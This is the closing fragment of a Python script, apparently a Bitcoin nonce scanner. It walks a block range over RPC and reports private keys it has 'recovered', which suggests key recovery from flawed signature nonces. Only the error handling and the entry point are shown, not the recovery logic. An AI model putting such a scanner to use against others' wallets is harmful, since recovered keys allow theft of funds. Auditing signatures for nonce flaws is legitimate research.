        logging.error(f"Authentication error: {e}")
        sys.exit(1)
    
    # Create scanner and run
    try:
        scanner = BitcoinNonceScanner(rpc_url, rpc_user, rpc_password)
        scanner.scan_blockchain(args.start_height, args.end_height)
        logging.info("✅ Scan completed successfully!")
    except KeyboardInterrupt:
        logging.info("\n⚠️  Scan interrupted by user")
        if scanner.recovered_keys:
            scanner._report_recovered_keys()
        sys.exit(0)
    except InvalidOperation as e:
        logging.error(f"Decimal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
    except Exception as e:
        logging.error(f"Scanner error: {e}")
        logging.error(f"Error type: {type(e)}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == '__main__':
    main()

